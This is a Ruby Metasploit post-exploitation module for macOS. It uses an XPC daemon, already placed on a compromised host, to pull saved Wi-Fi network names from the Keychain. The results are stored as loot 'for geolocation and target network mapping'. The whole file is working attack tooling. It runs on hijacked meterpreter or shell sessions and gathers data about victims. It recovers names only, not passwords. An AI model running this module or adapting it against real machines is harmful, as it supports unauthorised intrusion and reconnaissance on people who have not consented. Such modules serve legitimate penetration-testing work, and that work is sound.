##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Wi-Fi Network Name Enumeration',
        'Description'  => %q{
          Enumerates saved Wi-Fi network names (SSIDs) from the macOS Keychain
          via the XPC daemon. AirPort item secrets are ACL-protected and cannot
          be read from a daemon context (errSecInteractionNotAllowed), so this
          module recovers network names only — still useful for geolocation
          and target network mapping. Results are stored as loot.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Enumerating Wi-Fi network names via XPC daemon...")
    data = xpc_exec!('k4', timeout: 45)
    return if data.nil?

    ssids = []
    data.to_s.each_line do |line|
      line.strip!
      next if line.empty? || line.start_with?('===')
      ssids << line.sub(/^\s+/, '')
    end

    tbl = Rex::Text::Table.new(
      'Header'  => 'Wi-Fi Networks (SSID)',
      'Indent'  => 2,
      'Columns' => ['#', 'SSID']
    )
    ssids.each_with_index { |s, i| tbl << [i + 1, s] }
    print_line(tbl.to_s) unless ssids.empty?

    loot_path = xpc_store_loot(
      'wifi_names',
      ssids.join("\n"),
      'wifi_names.txt',
      'macOS Wi-Fi network names (SSID) via XPC'
    )
    print_good("#{ssids.length} Wi-Fi network name(s) recovered, saved to #{loot_path}")
  end
end
